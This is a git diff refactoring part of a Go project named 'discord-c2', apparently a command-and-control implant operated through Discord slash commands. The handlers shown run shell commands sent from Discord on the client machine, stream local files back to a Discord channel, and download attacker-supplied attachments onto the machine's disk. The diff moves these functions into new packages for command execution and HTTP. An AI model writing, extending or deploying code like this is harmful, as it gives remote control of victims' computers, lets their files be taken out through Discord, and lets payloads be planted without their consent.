@@ -1,15 +1,17 @@
-package main
+package commands
 
 // This file contains filesystem-related slash commands such as cwd, ls,
 // download, and upload.
 
 import (
 	"io"
-	"net/http"
 	"os"
 	"path/filepath"
 	"runtime"
 	"strings"
+
+	"discord-c2/internal/httpx"
+	"discord-c2/internal/shell"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -28,7 +30,7 @@ func handleSlashCwd(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	runCommandString(s, i.ChannelID, nil, cmd)
+	shell.Run(s, i.ChannelID, nil, cmd)
 }
 
 // handleSlashLs lists a directory on the client, defaulting to the current
@@ -56,7 +58,7 @@ func handleSlashLs(s *discordgo.Session, i *discordgo.InteractionCreate, data di
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	runCommandString(s, i.ChannelID, nil, cmdStr)
+	shell.Run(s, i.ChannelID, nil, cmdStr)
 }
 
 // handleSlashDownload streams a small local file back to Discord as an
@@ -179,7 +181,7 @@ func handleSlashUpload(s *discordgo.Session, i *discordgo.InteractionCreate, dat
 		return
 	}
 	defer out.Close()
-	resp, err := http.Get(attachment.URL)
+	resp, err := httpx.Client.Get(attachment.URL)
 	if err != nil {
 		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 			Type: discordgo.InteractionResponseChannelMessageWithSource,
